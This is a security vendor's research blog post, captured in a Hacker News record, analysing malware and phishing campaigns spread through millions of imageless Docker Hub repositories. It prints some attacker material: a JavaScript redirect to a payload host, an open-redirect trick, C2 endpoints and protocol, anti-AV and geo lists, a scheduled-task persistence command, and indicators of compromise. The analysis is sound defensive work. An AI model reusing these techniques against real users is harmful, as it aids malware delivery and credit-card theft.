{"aid": "40216116", "title": "JFrog research discovers coordinated attacks on Docker Hub that planted millions", "url": "https://jfrog.com/blog/attacks-on-docker-with-millions-of-malicious-repositories-spread-malware-and-phishing-scams/", "domain": "jfrog.com", "votes": 7, "user": "based2", "posted_at": "2024-04-30 20:44:58", "comments": 0, "source_title": "Nearly 20% of Docker Hub Repositories Spread Malware & Phishing Scams", "source_text": "Nearly 20% of Docker Hub Repositories Spread Malware & Phishing Scams\n\n___\n\nBlog Home\n\n# JFrog research discovers coordinated attacks on Docker Hub that planted\nmillions of malicious repositories\n\nJFrog and Docker collaborate on mitigation and cleanup following latest\nfindings of Docker Hub Repositories being used to spread malware and phishing\nscams\n\nBy Andrey Polkovnichenko, Security Researcher Brian Moussalli, Malware\nResearch Team Leader Shachar Menashe, Senior Director Security Research April\n30, 2024\n\n19 min read\n\nSHARE:\n\nAs key parts of the software ecosystem, and as partners, JFrog and Docker are\nworking together to strengthen the software ecosystem. Part of this effort by\nJFrog\u2019s security research team involves continuous monitoring of open-source\nsoftware registries in order to proactively identify and address potential\nmalware and vulnerability threats.\n\nIn former publications, we have discussed some of the malware packages we\nfound on the NPM, PyPI and NuGet registries by continuously scanning all major\npublic repositories. In this blog post, we reveal three large-scale malware\ncampaigns we\u2019ve recently discovered, targeting Docker Hub, that planted\nmillions of \u201cimageless\u201d repositories with malicious metadata. These are\nrepositories that do not contain container images (and as such cannot be run\nin a Docker engine or Kubernetes cluster) but instead contain metadata that is\nmalicious.\n\nDocker Hub is a platform that delivers many functionalities to developers,\npresenting numerous opportunities for development, collaboration, and\ndistribution of Docker images. Currently, it is the number one container\nplatform of choice for developers worldwide. It hosts over 15 million\nrepositories.\n\nYet, a significant concern arises when considering the content of these public\nrepositories. Our research reveals that nearly 20% of these public\nrepositories (almost three million repositories!) actually hosted malicious\ncontent. The content ranged from simple spam that promotes pirated content, to\nextremely malicious entities such as malware and phishing sites, uploaded by\nautomatically generated accounts.\n\nWhile the Docker Hub maintainers currently moderate many of the uploaded\nrepositories, and the repositories we found have been taken down after our\ndisclosure, these attacks show that blocking 100% of malicious uploads is\nimmensely challenging.\n\n## What enabled this attack?\n\nDocker Hub is Docker\u2019s cloud-based registry service that hosts and distributes\nimages. Its core concept is a repository, which includes text descriptions and\nmetadata on top of the container data.\n\nDocker Hub\u2019s repository library (click to expand)\n\nWhile the core feature of a Docker repository is to hold a collection of\nDocker images (an application that can be updated and accessible through a\nfixed name), Docker Hub introduces several key enhancements. The most\nsignificant of them is community features.\n\nFor public repositories, Docker Hub acts as a community platform. It allows\nusers to search and discover images that might be useful for their projects.\nUsers can also rate and comment on repositories, helping others gauge the\nreliability and utility of available images.\n\nTo help users search and use images, Docker Hub allows repository maintainers\nto add short descriptions and documentation in HTML format, which will be\ndisplayed on the repository\u2019s main page. Usually, repository documentation\naims to explain the purpose of the image and provide guidelines for its usage.\n\nExample of a Legitimate Repository\u2019s Documentation\n\nBut as Murphy\u2019s law for security says, if something can be exploited by\nmalware developers, it inevitably will be.\n\nJFrog\u2019s security research team discovered that ~4.6 million of the\nrepositories in Docker Hub are imageless and have no content except for the\nrepository\u2019s documentation. A deeper inspection revealed that the vast\nmajority of these imageless repositories were uploaded with a malicious\nendgame \u2013 their overview page tries to deceive users into visiting phishing\nwebsites or websites that host dangerous malware.\n\nBefore discussing the various malicious payloads, we will explain our\nmethodology for finding these malicious repositories.\n\n## Identifying the malicious repositories\n\nWe started our research by identifying anomalies in the publication patterns\nof Docker Hub repositories. To achieve this, we pulled all \u201cimageless\u201d Docker\nHub repositories published in the past five years, grouped them by creation\ndate, and plotted them on a graph:\n\nGraph of Monthly Created Repositories\n\nAs we can see, the usual activity on Docker Hub is quite linear, but we can\nsee a few spikes in 2021 and 2023. If we zoom in, we see that the daily\nactivity is well-defined and follows a working week pattern. Even visually, we\ncan notice a working week pattern: more repositories are created on work days\nand fewer on weekends.\n\nZooming in on the 2023 anomaly\n\nThe graph shows that when the unusual activity starts, the number of daily-\ncreated repositories multiplies tenfold.\n\nWe thoroughly analyzed the repositories created on days with anomalies and\nfound many repositories deviated from the norm. The main deviation is that\nthey didn\u2019t contain container images, just a documentation page, making the\nrepository unusable, as it can\u2019t be pulled and run as a normal docker image.\n\nExample of a Malicious Repository\n\nFor instance, the repository shown in the screenshot above contains a few\nlinks in the description directing users to a phishing website:\nhttps[://]www[.******medz*****.]com. This site deceives unsuspecting visitors\nby promising to purchase prescription-only medications but then stealing their\ncredit card details.\n\nWhile all anomalous repositories were somewhat different from each other and\nwere published by various users, most followed the same patterns. That allowed\nus to create a signature and group them by families (or campaigns). Once we\napplied this signature to all imageless repositories, we gathered a list of\nthe hub users publishing them. We classified all repositories published by\nthese users as malware as well.\n\nAfter we plotted the campaigns on the timeline, we got an understanding of the\nperiods when the largest malware campaigns operated.\n\nTwo were most active in the first half of 2021, publishing thousands of\nrepositories daily. The downloader campaign made one more attempt in August\n2023. The \u201cWebsite SEO\u201d campaign operated differently, consistently pushing a\nsmall number of repositories daily over three years.\n\nMalware Repositories Registered Per Day by Campaign\n\nAt the time of DockerCon 2023, Docker Hub contained 15 million repositories,\nso we will use this number as reference for the total Docker Hub repository\ncount.\n\nThe total number of imageless repositories published to Docker Hub is 4.6M \u2013\n30% of all public repositories. We were able to link 2.81M (~19%) of these\nrepositories to these large malicious campaigns.\n\nIn addition to the large campaigns we identified, our analysis also revealed\nthe presence of smaller sets of repositories. These campaigns seemed mostly\nfocused on spam / SEO, however we could not classify all of the variants of\nthese campaigns. These smaller \u201ccampaigns\u201d contained less than 1000 packages\neach. For our categorization, we allocated these smaller sets to a group\nlabeled \u201cOther suspicious\u201d \u2013\n\nDockerHub repositories classification\n\nDistribution of malicious repositories by campaigns:\n\nCampaign| # of Repositories (% of all DH Repositories)| # of Users  \n---|---|---  \nWebsite SEO| 215451 (1.4%)| 194699  \nDownloader| 1453228 (9.7%)| 9309  \neBook Phishing| 1069160 (7.1%)| 1042  \nOther suspicious imageless| 76025 (0.5%)| 3689  \nTotal| 2.81M (18.7%)| 208739  \n  \nWe can see different approaches in the distribution of the malicious\nrepositories. While the \u201cDownloader\u201d and \u201ceBook Phishing\u201d campaigns create\nfake repositories in batches over a short time period, the \u201cWebsite SEO\u201d\ncampaign creates a few repositories daily over the whole time frame and uses a\nsingle user per repository.\n\nNow that we know which main malware campaigns were running on Docker Hub,\nlet\u2019s review their tactics and techniques in depth.\n\n  1. \u201cDownloader\u201d Campaign\n  2. \u201ceBook Phishing\u201d Campaign\n  3. \u201cWebsite SEO\u201d Campaign\n\n## Analysis of the Docker Hub malware campaigns\n\n### 1\\. \u201cDownloader\u201d Campaign\n\nDistribution of the Downloader Campaign\u2019s Repositories\n\nRepositories belonging to this campaign contain automatically generated texts\nwith SEO text proposing to download pirated content or cheats for video games.\nAdditionally, the text includes a link to the alleged advertised software.\n\nThis campaign operated in two distinct rounds (circa 2021 and 2023), while\nboth rounds used exactly the same malicious payload (see analysis further\ndown).\n\nExample of a malicious repository with a malware download link\n\n#### The 2021 round \u2013 Malicious domains pretending to be URL shorteners\n\nMost URLs used in the campaign pretend to use known URL shorteners (ex.\ntinyurl.com), similar to an attack campaign on Google Ads found in 2021 as\nwell. After we tried to resolve them, we discovered that, unlike the real\nshorteners, these malicious shorteners don\u2019t actually encode the URL. Instead,\nthey encode a file name and resolve a link to a different domain each time a\nmalicious resource is shut down.\n\nFor instance, during our investigation, the URL blltly[.]com/1w1w1 redirected\nto\nhttps[://]failhostingpolp[.]ru/9ebeb1ba574fb8e786200c62159e77d15UtXt7/x60VKb8hl1YelOv1c5X1c0BuVzmFZ8-teb-\nLRH8w. However, subsequent requests to the server triggered the generation of\na new URL path each time.\n\nTheir sole purpose is to serve as a proxy for a malicious CDN.\n\nEvery subsequent request to the same shortened link brings a different URL,\nand if the server that\u2019s hosting malicious files is shut down, the shortener\nwill return a link to a new, active one.\n\nWe gathered a list of all malicious domains and compiled a table showing the\ncorrespondence between the fraudulent shorteners and their real, trustworthy\nversions.\n\nMalware shortener| Impersonated legitimate shortener  \n---|---  \nblltly[.]com bltlly[.]com byltly[.]com bytlly[.]com| https://bitly.com/  \ntinourl[.]com tinurli[.]com tinurll[.]com tiurll[.]com tlniurl[.]com|\nhttps://tinyurl.com  \nurlca[.]com urlcod[.]com urlgoal[.]com urllie[.]com urllio[.]com urloso[.]com\nurluso[.]com urluss[.]com| https://urlgo.in/  \nimgfil[.]com| https://imgflip.com/  \ncinurl[.]com fancli[.]com geags[.]com gohhs[.]com jinyurl[.]com miimms[.]com\npicfs[.]com shoxet[.]com shurll[.]com ssurll[.]com tweeat[.]com vittuv[.]com  \n  \nFake URL Shorteners Used by the Malware Campaign\n\nThis strategy, developed in 2021, worked for some time until AV companies\nfound a list of the links and added them to their blacklists. Currently,\nbrowsers and providers raise alerts when an attempt is made to access one of\nthe links from the table above.\n\n#### The 2023 round \u2013 Enhanced anti-detection techniques\n\nThe second round of the campaign, which occurred in 2023, focused on avoiding\ndetection. The malicious repositories no longer use direct links to malicious\nsources. Instead, they point to legitimate resources as redirects to malicious\nsources.\n\nAmong these resources is a page hosted on blogger.com that contains JavaScript\ncode that redirects to the malicious payload after 500 milliseconds:\n\n    \n    \n    <script type='text/javascript'> var c = new URL(window.location).searchParams.get('el'); if(c!=null){ setTimeout('write()', 500); setTimeout('Redirect()', 0); }else{ window.setTimeout(function(){ document.getElementById('redir').href='https://gohhs.com/'; }, 500); } function write() { document.getElementById('redir').href='https://gohhs.com/'+c; } function Redirect() { window.location.replace('https://gohhs.com/'+c); } </script>\n\nAnother approach is a well-known open redirect bug in Google, which allows\nmalicious actors to redirect users to a malicious site with a legitimate\nGoogle link using specific parameters.\n\nNormally, the Google link\nhttps://www[.]google[.]com/url?q=https%3A%2F%2Fexample.us%2F doesn\u2019t redirect\na user to the target site. Instead, it shows a notice warning that they are\nbeing redirected to another domain.\n\nExample of a Redirection Notice\n\nHowever, it\u2019s possible to add the undocumented parameter usg to disable this\nwarning. The parameter contains a hash or signature that causes google.com to\nredirect to the target site automatically \u2013\n\nPROTOCOL:| https  \n---|---  \nHOST:| www.google.com  \nPATH:| /url  \nPARAMS:| | q| =| https://urlin.us/2vwNSW  \n---|---|---  \nsa| =| D  \nsntz| =| 1  \nusg| =| AOvVaw1A6cBKittNvLawLc7IB9M0  \n  \nThis redirect leads to the target site. At the time of writing, the target\nsites were gts794[.]com and failhostingpolp[.]ru. These sites lure the victim\nto download an advertised software. However, regardless of the name on the\nlanding page, the downloaded file is always the same archive with an EXE\ninstaller. As we can see in the AnyRun analysis, the malware installs a binary\ncalled freehtmlvalidator.exe into the directory \u201c%LOCALAPPDATA%\\HTML Free\nValidator\u201d\n\nMalicious Payload Served in the Downloader Campaign\n\n#### Analysis of the \u201cDownloader\u201d campaign payload\n\nThe payload of the \u201cDownloader\u201d campaign is a malicious executable that most\nantivirus engines detect as a generic Trojan.\n\nDetection of the Served Payload by Antiviruses\n\nThe malware is written with the successor to the once-popular Delphi\nenvironment: Embarcadero RAD Studio 27.0.\n\nThe malware communicates with the C2C server\nhttp://soneservice[.]shop/new/net_api using HTTP POST requests. The request is\na JSON message XORed with the three-byte key \u201c787\u201d and encoded in hex.\n\n    \n    \n    { \"5E4B1B4F\": \"4D571F435C025E5B0A465B114B4602455C0F4B460A\", \"465B0F\": \"664eed76ed570dbb4cba2bdcb3479b5f\", \"4E531F4B\": \"en\" }\n\nThe fields of the JSON are encoded in the same manner but using a different\nkey: \u201c*2k\u201d. Knowing this, we can decode the request to\n\n    \n    \n    { \"type\": \"getinitializationdata\", \"lid\": \"664eed76ed570dbb4cba2bdcb3479b5f\", \"data\": \"en\" }\n\nThe first command sent by the malware to the server is getinitializationdata.\nIt contains two parameters: the malware\u2019s unique identifier (\u201clid\u201d) and the\nsystem locale identifier. The latter informs the server about the language\nsetting of the infected system, enabling customized responses. The malware\nuses this unique identifier for all subsequent server requests.\n\nIn response, the server provides layout and localization details specific to\nDelphi, which are adapted based on the system\u2019s language setting.\n\nAfterwards, the malware sends an initialization request passing information\nabout the infected system. The information includes OS-specific information,\nhardware, installed browser, version of the .NET framework, running processes,\nand available network adapters. The server, in return, provides a link to the\nalleged promised software and a list of offers. The promised software part is\nrepresented by URL and file name:\n\n    \n    \n    \"file\": { \"download_url\": \"http:\\/\\/totrakto.com\\/CRACK-IDA-Pro-V6-8-150423-And-HEX-Rays-Decompiler-ARM-X86-X64-iDAPROl.zip\", \"name\": \"CRACK-IDA-Pro-V6-8-150423-And-HEX-Rays-Decompiler-ARM-X86-X64-iDAPROl.zip\", \"size\": 64918480 },\n\nMalware\u2019s Communication with the C2 Server\n\nThe \u201coffers\u201d section of the response contains a list of the links to\nexecutables, too. Additionally, it outlines various conditions that must be\nmet to drop executables. The most significant conditions are:\n\n  * excludeGeoTargeting contains codes of countries where the malware shouldn\u2019t be installed\n    \n        \"excludeGeoTargeting\": [ \"RU\", \"AZ\", \"AM\", \"BY\", ]\n\n  * blackAvList contains a list of antivirus applications that will also prevent the malware from being installed\n    \n        \"blackAvList\": [ \"avast\", \"avg\", \"avira\", \"nod32\", \"mcafeeep\", \"windef\", ]\n\n  * A process blacklist (wasn\u2019t observed in payload sample)\n  * A list of Windows registry entries that must be present on the target system (wasn\u2019t observed in payload sample)\n\nConsidering that the malware already sends information about the system to the\nserver, we find these conditions on the client a bit redundant. Also, the\nresponse contains fields that were never used by the malware binary but are\ntypical for advertisement networks, such as price, offer_id, and\nadvertiser_id. From these fields we can assume that this malware operation is\npart of a broader ecosystem, potentially involving adware or monetization\nschemes that benefit from the distribution and installation of third-party\nsoftware. Building on this understanding, we further assume that these request\nparameters are likely copied and embedded into the software from a dubious\nadvertising network API, where third parties may pay for the distribution of\ntheir executables.\n\n    \n    \n    \"advertiser_id\": 7, \"groupOffer_id\": 43, \"price\": 0.064, \"price_usd\": 0.064, \"tarif\": 0.08, \"use_balance\": \"0\",\n\nAfter processing the response, the malware shows an installation dialog that\nproposes to the user to download and install the software promised in the\nmalicious Docker Hub repository \u2013\n\nInstallation Dialog Shown by Malware\n\nAfter accepting, in addition to installing the promised software, the malware\njust downloads all the malicious binaries from offer and schedules their\npersistent execution with the command \u201cSCHTASKS.exe /Create /TN <random_name>\n/RL HIGHEST /SC DAILY\u201d.\n\n### 2\\. \u201ceBook Phishing\u201d Campaign\n\nMalware repositories registered per day by ebook_phishing campaign\n\nNearly a million repositories created in the middle of 2021 turned Docker Hub\ninto a \u201cpirated eBook library\u201d. These spam repositories all offered free eBook\ndownloads containing randomly generated descriptions and download URLs \u2013\n\nExample of an eBook phishing repository\n\nAll links eventually redirect the user to the same page:\nhttp://rd[.]lesac[.]ru/.\n\neBook download landing page\n\nAfter promising a free full version of the eBook, the website chooses a random\npage from the set available for the user\u2019s IP and redirects them there. The\nfollowing steps depend on the user\u2019s country, but usually, it\u2019s a form asking\nthe user to enter credit card information.\n\nUndoubtedly, the sole intent behind this action is phishing, aiming to steal\ncredit card details and unknowingly enroll the user in a subscription service.\nThe footer on these target sites usually has barely-readable text, saying the\nsubscription charges 40-60\u20ac per month.\n\nSome phishing sites from the campaign (click to expand)\n\n### 3\\. \u201cWebsite SEO\u201d Campaign\n\nUnlike the previous two campaigns, which were blatantly malicious (phishing /\nmalware download) the aim of this campaign is not so clear. While the\nrepositories themselves were obviously not uploaded in good faith, the content\nis mostly harmless \u2013 just a random description string with a username\ngenerated by the pattern \u201caxaaaaaxxx\u201d where a is a letter and x is a digit.\nAll repositories published by these users have the same name: website.\n\nIt is possible that the campaign was used as some sort of a stress test before\nenacting the truly malicious campaigns.\n\nThis campaign also has a different registration routine. As we can see from\nthe graph, the actors behind this campaign created a thousand repositories\ndaily across three years! This is unlike the previous campaigns, which focused\non generating imageless repositories in a much shorter time. In this campaign\nthe attackers published only one repository per created user, whereas in the\nprevious campaigns, a single user was used to publish thousands of\nrepositories.\n\nMalware repositories registered per day by \u201cWebsite SEO\u201d campaign\n\nIn this campaign, the repository description usually contains a short,\nseemingly random, and senseless phrase without any other information. Some of\nthe repositories contain links to social network sites, but these seem to\ncontain mostly garbage as well, and not malicious URLs or files \u2013\n\nExample of a Website SEO Campaign Repositories\u2019 Description\n\nBelow are some user names from this campaign, with the relevant descriptions\nin the repository documentation \u2013\n\nRandom Phrases from the Website SEO Campaign\u2019s Repositories\n\nWhen we searched for these usernames, we found that this campaign also\ntargeted other platforms that have open contribution policies \u2013\n\nWebsite SEO Campaign Usernames Used in other Platforms\n\n## Disclosure to Docker Inc.\n\nPrior to this publication, the JFrog research team disclosed all findings to\nthe Docker security team, including 3.2M repositories that were suspected as\nhosting malicious or unwanted content. The Docker security team quickly\nremoved all of the malicious and unwanted repositories from Docker Hub. We\nwould like to thank the Docker security team for handling this disclosure\nquickly and professionally, and are happy to contribute to the continued safe\nuse of the Docker ecosystem.\n\n## How Can Docker Hub Users Avoid Similar Attacks?\n\nUsers should prefer using Docker images that are marked in Docker Hub as\n\u201cTrusted Content\u201d \u2013\n\nDocker Hub has designated tags for trusted content that users can look for\nwhen browsing an image\u2019s description page. The first tag is the Docker\nOfficial Image tag, otherwise known as Docker Hub\u2019s Library, a set of curated\nDocker repositories. The Library consists of repositories that are maintained\nby trusted and well-known software development foundations, organizations and\ncompanies, such as Python, Ubuntu and Node. The second tag is the Verified\nPublisher tag, which is assigned to every repository that is part of the\nDocker Verified Publisher Program. This set contains repositories from\ncommercial publishers, who have been verified by Docker Hub. And lastly, the\nSponsored OSS tag, which is assigned to repositories of open source projects\nthat are sponsored by Docker Hub.\n\nWhen browsing a repository\u2019s page, a badge that indicates that the repository\nis part of one of the aforementioned types would appear next to the\nrepository\u2019s name, at the top of the page \u2013\n\nFollowing these guidelines would decrease the risk of being manipulated into\nfollowing a malicious link outside of Docker Hub from a repository\u2019s\ndescription page. For example \u2013 none of the malicious repositories mentioned\nin this blog was marked as \u201cTrusted Content\u201d.\n\n## Summary\n\nUnlike typical attacks targeting developers and organizations directly, the\nattackers in this case tried to leverage Docker Hub\u2019s platform credibility,\nmaking it more difficult to identify the phishing and malware installation\nattempts.\n\nAlmost three million malicious repositories, some of them active for over\nthree years highlight the attackers\u2019 continued misuse of the Docker Hub\nplatform and the need for constant moderation on such platforms.\n\n## IoCs\n\nfailhostingpolp[.]ru gts794[.]com blltly[.]com ltlly[.]com byltly[.]com\nbytlly[.]com cinurl[.]com fancli[.]com geags[.]com gohhs[.]com imgfil[.]com\njinyurl[.]com miimms[.]com picfs[.]com shoxet[.]com shurll[.]com ssurll[.]com\ntinourl[.]com tinurli[.]com tinurll[.]com tiurll[.]com tlniurl[.]com\ntweeat[.]com urlca[.]com urlcod[.]com urlgoal[.]com urllie[.]com urllio[.]com\nurloso[.]com urluso[.]com urluss[.]com vittuv[.]com rd[.]lesac[.]ru\nsoneservice[.]shop\n\n## Stay up-to-date with JFrog Security Research\n\nThe security research team\u2019s findings and research play an important role in\nimproving the JFrog Software Supply Chain Platform\u2019s application software\nsecurity capabilities.\n\nFollow the latest discoveries and technical updates from the JFrog Security\nResearch team on our research website, and on X @JFrogSecurity.\n\nTags: security-research docker docker registry\n\nSHARE:\n\nSign up for blog updates\n\n### Popular Tags\n\n  * CI/CD\n  * Artifactory\n  * Best Practices\n  * DevOps\n  * Xray\n\n## Try the JFrog Platform\n\n### In the cloud or self-hosted\n\nStart Free\n\nor Book a Demo\n\n## Thank You!\n\nProducts\n\n  * Artifactory\n  * Xray\n  * Curation\n  * Pipelines\n  * Distribution\n  * Container Registry\n  * Connect\n\n  * JFrog Platform\n\n  * Start Free\n\nResources\n\n  * Blog\n  * Security Research\n  * Events\n  * Integrations\n  * JFrog Help Center\n  * DevOps Tools\n  * Open Source\n  * Featured\n  * JFrog Trust\n  * Compare JFrog\n\nCompany\n\n  * About\n  * Management\n  * Investor Relations\n  * Partners\n  * Customers\n  * Careers\n\n  * Press\n  * Contact Us\n  * Brand Guidelines\n\nDeveloper\n\n  * Community\n  * Downloads\n  * Community Events\n  * Open Source Foundations\n  * Community Forum\n  * Superfrogs\n  * Applications\n\nFollow Us\n\n\u00a9 2024 JFrog Ltd All Rights Reserved\n\nDiscover More\n\n  * IoT Management Platform\n  * Software Supply Chain Platform Pricing\n  * End to End Security Tool for DevOps\n\nTerms of Use | Privacy Policy | Cookies Policy |\n\nCookies Settings\n\n| Accessibility Notice | Accessibility Mode\n\n## Success\n\nYour action was successful\n\n## Oops... Something went wrong\n\nPlease try again later\n\n## Information\n\nModal Message\n\nClick Here\n\n\u8bf7\u70b9\u8fd9\u91cc\n\n", "frontpage": true}
